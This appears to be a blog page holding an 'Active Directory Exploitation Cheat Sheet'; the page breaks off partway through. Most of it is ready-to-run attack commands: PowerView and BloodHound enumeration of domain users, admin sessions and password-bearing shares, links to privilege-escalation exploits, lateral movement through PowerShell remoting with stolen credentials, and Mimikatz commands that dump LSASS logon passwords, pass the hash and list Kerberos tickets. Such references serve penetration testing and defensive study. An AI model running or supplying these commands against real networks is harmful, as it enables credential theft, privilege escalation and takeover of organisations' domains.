t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!0,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="not-prose my-4 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div><div class="article-content max-w-prose mb-20"><h1 class="relative group">Active Directory Exploitation Cheat Sheet<div id=active-directory-exploitation-cheat-sheet class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#active-directory-exploitation-cheat-sheet aria-label=Anchor>#</a></span></h1><p>A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.</p><p>This cheat sheet is inspired by the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings target=_blank rel=noreferrer>PayloadAllTheThings</a> repo.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt="Just Walking The Dog" src=https://raw.githubusercontent.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/master/WalkTheDog.png></figure><h2 class="relative group">Summary<div id=summary class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#summary aria-label=Anchor>#</a></span></h2><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#active-directory-exploitation-cheat-sheet>Active Directory Exploitation Cheat Sheet</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#summary>Summary</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#tools>Tools</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#domain-enumeration>Domain Enumeration</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#using-powerview>Using PowerView</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#using-ad-module>Using AD Module</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#using-bloodhound>Using BloodHound</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#useful-enumeration-tools>Useful Enumeration Tools</a></li></ul></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#local-privilege-escalation>Local Privilege Escalation</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#useful-local-priv-esc-tools>Useful Local Priv Esc Tools</a></li></ul></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#lateral-movement>Lateral Movement</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#powershell-remoting>Powershell Remoting</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#executing-remote-stateful-commands>Executing Remote Stateful commands</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#mimikatz>Mimikatz</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#useful-tools>Useful Tools</a></li></ul></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#domain-privilege-escalation>Domain Privilege Escalation</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#kerberoast>Kerberoast</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#asreproast>ASREPRoast</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#password-spray-attack>Password Spray Attack</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#force-set-spn>Force Set SPN</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-shadow-copies>Abusing Shadow Copies</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#unconstrained-delegation>Unconstrained Delegation</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#constrained-delegation>Constrained Delegation</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#resource-based-constrained-delegation>Resource Based Constrained Delegation</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#dnsadmins-abuse>DNSAdmins Abuse</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-backup-operators-group>Abusing Backup Operators Group</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-exchange>Abusing Exchange</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#weaponizing-printer-bug>Weaponizing Printer Bug</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-acls>Abusing ACLs</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#sid-history-abuse>SID History Abuse</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#exploiting-sharepoint>Exploiting SharePoint</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#zerologon-exploit>Zerologon Exploit</a></li></ul></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#domain-persistence>Domain Persistence</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#golden-ticket-attack>Golden Ticket Attack</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#dcsync-attack>DCsync Attack</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#silver-ticket-attack>Silver Ticket Attack</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#skeleton-key-attack>Skeleton Key Attack</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#dsrm-abuse>DSRM Abuse</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#custom-ssp>Custom SSP</a></li></ul></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#cross-forest-attacks>Cross Forest Attacks</a><ul><li><a href=/post/active-directory-exploitation-cheat-sheet/#trust-tickets>Trust Tickets</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#abuse-mssql-servers>Abuse MSSQL Servers</a></li><li><a href=/post/active-directory-exploitation-cheat-sheet/#breaking-forest-trusts>Breaking Forest Trusts</a></li></ul></li></ul></li></ul><h2 class="relative group">Tools<div id=tools class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#tools aria-label=Anchor>#</a></span></h2><ul><li><a href=https://github.com/PowerShellMafia/PowerSploit/tree/dev target=_blank rel=noreferrer>Powersploit</a></li><li><a href=https://github.com/NetSPI/PowerUpSQL target=_blank rel=noreferrer>PowerUpSQL</a></li><li><a href=https://github.com/Kevin-Robertson/Powermad target=_blank rel=noreferrer>Powermad</a></li><li><a href=https://github.com/SecureAuthCorp/impacket target=_blank rel=noreferrer>Impacket</a></li><li><a href=https://github.com/gentilkiwi/mimikatz target=_blank rel=noreferrer>Mimikatz</a></li><li><a href=https://github.com/GhostPack/Rubeus target=_blank rel=noreferrer>Rubeus</a> -> <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries target=_blank rel=noreferrer>Compiled Version</a></li><li><a href=https://github.com/BloodHoundAD/BloodHound target=_blank rel=noreferrer>BloodHound</a></li><li><a href=https://github.com/samratashok/ADModule target=_blank rel=noreferrer>AD Module</a></li><li><a href=https://github.com/HarmJ0y/ASREPRoast target=_blank rel=noreferrer>ASREPRoast</a></li></ul><h2 class="relative group">Domain Enumeration<div id=domain-enumeration class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#domain-enumeration aria-label=Anchor>#</a></span></h2><h3 class="relative group">Using PowerView<div id=using-powerview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#using-powerview aria-label=Anchor>#</a></span></h3><p><a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 target=_blank rel=noreferrer>Powerview v.3.0</a><br><a href=https://powersploit.readthedocs.io/en/latest/ target=_blank rel=noreferrer>Powerview Wiki</a></p><ul><li><strong>Get Current Domain:</strong> <code>Get-Domain</code></li><li><strong>Enumerate Other Domains:</strong> <code>Get-Domain -Domain &lt;DomainName></code></li><li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li><li><strong>Get Domain Policy:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainPolicy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Will show us the policy configurations of the Domain about system access or kerberos
</span></span><span class=line><span class=cl>Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
</span></span><span class=line><span class=cl>Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy</span></span></code></pre></div></div></li><li><strong>Get Domain Controllers:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainController
</span></span><span class=line><span class=cl>Get-DomainController -Domain &lt;DomainName&gt;</span></span></code></pre></div></div></li><li><strong>Enumerate Domain Users:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Save all Domain Users to a file
</span></span><span class=line><span class=cl>Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Will return specific properties of a specific user
</span></span><span class=line><span class=cl>Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate user logged on a machine
</span></span><span class=line><span class=cl>Get-NetLoggedon -ComputerName &lt;ComputerName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate Session Information for a machine
</span></span><span class=line><span class=cl>Get-NetSession -ComputerName &lt;ComputerName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate domain machines of the current/specified domain where specific users are logged into
</span></span><span class=line><span class=cl>Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName</span></span></code></pre></div></div></li><li><strong>Enum Domain Computers:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate Live machines 
</span></span><span class=line><span class=cl>Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName</span></span></code></pre></div></div></li><li><strong>Enum Groups and Group Members:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Save all Domain Groups to a file:
</span></span><span class=line><span class=cl>Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)
</span></span><span class=line><span class=cl>Get-DomainGroup -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object -ExpandProperty Member 
</span></span><span class=line><span class=cl>Get-DomainGroupMember -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object MemberDistinguishedName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
</span></span><span class=line><span class=cl>Get-NetLocalGroup | Select-Object GroupName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
</span></span><span class=line><span class=cl>Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
</span></span><span class=line><span class=cl>Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName</span></span></code></pre></div></div></li><li><strong>Enumerate Shares:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Enumerate Domain Shares
</span></span><span class=line><span class=cl>Find-DomainShare
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate Domain Shares the current user has access
</span></span><span class=line><span class=cl>Find-DomainShare -CheckShareAccess
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate &#34;Interesting&#34; Files on accessible shares
</span></span><span class=line><span class=cl>Find-InterestingDomainShareFile -Include *passwords*</span></span></code></pre></div></div></li><li><strong>Enum Group Policies:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate all GPOs to a specific computer
</span></span><span class=line><span class=cl>Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get users that are part of a Machine&#39;s local Admin group
</span></span><span class=line><span class=cl>Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;</span></span></code></pre></div></div></li><li><strong>Enum OUs:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainOU -Properties Name | Sort-Object -Property Name</span></span></code></pre></div></div></li><li><strong>Enum ACLs:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl># Returns the ACLs associated with the specified account
</span></span><span class=line><span class=cl>Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Search for interesting ACEs
</span></span><span class=line><span class=cl>Find-InterestingDomainAcl -ResolveGUIDs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Check the ACLs associated with a specified path (e.g smb share)
</span></span><span class=line><span class=cl>Get-PathAcl -Path &#34;\\Path\Of\A\Share&#34;</span></span></code></pre></div></div></li><li><strong>Enum Domain Trust:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-DomainTrust
</span></span><span class=line><span class=cl>Get-DomainTrust -Domain &lt;DomainName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
</span></span><span class=line><span class=cl>Get-DomainTrustMapping</span></span></code></pre></div></div></li><li><strong>Enum Forest Trust:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ForestDomain
</span></span><span class=line><span class=cl>Get-ForestDomain -Forest &lt;ForestName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Map the Trust of the Forest
</span></span><span class=line><span class=cl>Get-ForestTrust
</span></span><span class=line><span class=cl>Get-ForestTrust -Forest &lt;ForestName&gt;</span></span></code></pre></div></div></li><li><strong>User Hunting:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Finds all machines on the current domain where the current user has local admin access
</span></span><span class=line><span class=cl>Find-LocalAdminAccess -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Find local admins on all machines of the domain
</span></span><span class=line><span class=cl>Find-DomainLocalGroupMember -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Find computers were a Domain Admin OR a spesified user has a session
</span></span><span class=line><span class=cl>Find-DomainUserLocation | Select-Object UserName, SessionFromName
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Confirming admin access
</span></span><span class=line><span class=cl>Test-AdminAccess</span></span></code></pre></div></div>&#x2757; <strong>Priv Esc to Domain Admin with User Hunting:</strong><br>I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!</li></ul><h3 class="relative group">Using AD Module<div id=using-ad-module class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#using-ad-module aria-label=Anchor>#</a></span></h3><ul><li><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></li><li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain></code></li><li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li><li><strong>Get Domain Controlers:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ADDomainController
</span></span><span class=line><span class=cl>Get-ADDomainController -Identity &lt;DomainName&gt;</span></span></code></pre></div></div></li><li><strong>Enumerate Domain Users:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get a spesific &#34;string&#34; on a user&#39;s attribute
</span></span><span class=line><span class=cl>Get-ADUser -Filter &#39;Description -like &#34;*wtver*&#34;&#39; -Properties Description | select Name, Description</span></span></code></pre></div></div></li><li><strong>Enum Domain Computers:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ADComputer -Filter * -Properties *
</span></span><span class=line><span class=cl>Get-ADGroup -Filter * </span></span></code></pre></div></div></li><li><strong>Enum Domain Trust:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ADTrust -Filter *
</span></span><span class=line><span class=cl>Get-ADTrust -Identity &lt;DomainName&gt;</span></span></code></pre></div></div></li><li><strong>Enum Forest Trust:</strong><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-ADForest
</span></span><span class=line><span class=cl>Get-ADForest -Identity &lt;ForestName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Domains of Forest Enumeration
</span></span><span class=line><span class=cl>(Get-ADForest).Domains</span></span></code></pre></div></div></li><li><strong>Enum Local AppLocker Effective Policy:</strong></li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span></span></code></pre></div></div><h3 class="relative group">Using BloodHound<div id=using-bloodhound class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#using-bloodhound aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Using exe ingestor
</span></span><span class=line><span class=cl>.\SharpHound.exe --CollectionMethod All --LDAPUser &lt;UserName&gt; --LDAPPass &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>#Using powershell module ingestor
</span></span><span class=line><span class=cl>. .\SharpHound.ps1
</span></span><span class=line><span class=cl>Invoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;</span></span></code></pre></div></div><h3 class="relative group">Useful Enumeration Tools<div id=useful-enumeration-tools class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#useful-enumeration-tools aria-label=Anchor>#</a></span></h3><ul><li><a href=https://github.com/dirkjanm/ldapdomaindump target=_blank rel=noreferrer>ldapdomaindump</a> Information dumper via LDAP</li><li><a href=https://github.com/dirkjanm/adidnsdump target=_blank rel=noreferrer>adidnsdump</a> Integrated DNS dumping by any authenticated user</li><li><a href=https://github.com/cyberark/ACLight target=_blank rel=noreferrer>ACLight</a> Advanced Discovery of Privileged Accounts</li><li><a href=https://github.com/sense-of-security/ADRecon target=_blank rel=noreferrer>ADRecon</a> Detailed Active Directory Recon Tool</li></ul><h2 class="relative group">Local Privilege Escalation<div id=local-privilege-escalation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#local-privilege-escalation aria-label=Anchor>#</a></span></h2><h3 class="relative group">Useful Local Priv Esc Tools<div id=useful-local-priv-esc-tools class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#useful-local-priv-esc-tools aria-label=Anchor>#</a></span></h3><ul><li><p><a href=https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1 target=_blank rel=noreferrer>PowerUp</a> Misconfiguration Abuse</p></li><li><p><a href=https://github.com/AlessandroZ/BeRoot target=_blank rel=noreferrer>BeRoot</a> General Priv Esc Enumeration Tool</p></li><li><p><a href=https://github.com/enjoiz/Privesc target=_blank rel=noreferrer>Privesc</a> General Priv Esc Enumeration Tool</p></li><li><p><a href=https://github.com/itm4n/FullPowers target=_blank rel=noreferrer>FullPowers</a> Restore A Service Account&rsquo;s Privileges</p></li><li><p><a href=https://github.com/ohpe/juicy-potato target=_blank rel=noreferrer>Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p><p>&#9888;&#xfe0f; Works only until Windows Server 2016 and Windows 10 until patch 1803</p></li><li><p><a href=https://github.com/TsukiCTF/Lovely-Potato target=_blank rel=noreferrer>Lovely Potato</a> Automated Juicy Potato</p><p>&#9888;&#xfe0f; Works only until Windows Server 2016 and Windows 10 until patch 1803</p></li><li><p><a href=https://github.com/itm4n/PrintSpoofer target=_blank rel=noreferrer>PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</p><p>&#x1f64f; Works for Windows Server 2019 and Windows 10</p></li><li><p><a href=https://github.com/antonioCoco/RoguePotato target=_blank rel=noreferrer>RoguePotato</a> Upgraded Juicy Potato</p><p>&#x1f64f; Works for Windows Server 2019 and Windows 10</p></li><li><p><a href=https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/ target=_blank rel=noreferrer>Abusing Token Privileges</a></p></li><li><p><a href=https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/ target=_blank rel=noreferrer>SMBGhost CVE-2020-0796</a><br><a href=https://github.com/danigargu/CVE-2020-0796 target=_blank rel=noreferrer>PoC</a></p></li></ul><h2 class="relative group">Lateral Movement<div id=lateral-movement class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#lateral-movement aria-label=Anchor>#</a></span></h2><h3 class="relative group">Powershell Remoting<div id=powershell-remoting class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#powershell-remoting aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Enable Powershell Remoting on current Machine (Needs Admin Access)
</span></span><span class=line><span class=cl>Enable-PSRemoting
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Entering or Starting a new PSSession (Needs Admin Access)
</span></span><span class=line><span class=cl>$sess = New-PSSession -ComputerName &lt;Name&gt;
</span></span><span class=line><span class=cl>Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;</span></span></code></pre></div></div><h3 class="relative group">Remote Code Execution with PS Credentials<div id=remote-code-execution-with-ps-credentials class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#remote-code-execution-with-ps-credentials aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$SecPassword = ConvertTo-SecureString &#39;&lt;Wtver&gt;&#39; -AsPlainText -Force
</span></span><span class=line><span class=cl>$Cred = New-Object System.Management.Automation.PSCredential(&#39;htb.local\&lt;WtverUser&gt;&#39;, $SecPassword)
</span></span><span class=line><span class=cl>Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}</span></span></code></pre></div></div><h3 class="relative group">Import a powershell module and execute its functions remotely<div id=import-a-powershell-module-and-execute-its-functions-remotely class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#import-a-powershell-module-and-execute-its-functions-remotely aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Execute the command and start a session
</span></span><span class=line><span class=cl>Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Interact with the session
</span></span><span class=line><span class=cl>Enter-PSSession -Session $sess</span></span></code></pre></div></div><h3 class="relative group">Executing Remote Stateful commands<div id=executing-remote-stateful-commands class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#executing-remote-stateful-commands aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Create a new session
</span></span><span class=line><span class=cl>$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Execute command on the session
</span></span><span class=line><span class=cl>Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Check the result of the command to confirm we have an interactive session
</span></span><span class=line><span class=cl>Invoke-Command -Session $sess -ScriptBlock {$ps}</span></span></code></pre></div></div><h3 class="relative group">Mimikatz<div id=mimikatz class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#mimikatz aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#The commands are in cobalt strike format!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump LSASS:
</span></span><span class=line><span class=cl>mimikatz privilege::debug
</span></span><span class=line><span class=cl>mimikatz token::elevate
</span></span><span class=line><span class=cl>mimikatz sekurlsa::logonpasswords
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#(Over) Pass The Hash
</span></span><span class=line><span class=cl>mimikatz privilege::debug
</span></span><span class=line><span class=cl>mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List all available kerberos tickets in memory
</span></span><span class=line><span class=cl>mimikatz sekurlsa::tickets
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump local Terminal Services credentials
</span></span><span class=line><span class=cl>mimikatz sekurlsa::tspkg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump and save LSASS in a file
</span></span><span class=line><span class=cl>mimikatz sekurlsa::minidump c:\temp\lsass.dmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List cached MasterKeys
</span></span><span class=line><span class=cl>mimikatz sekurlsa::dpapi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List local Kerberos AES Keys
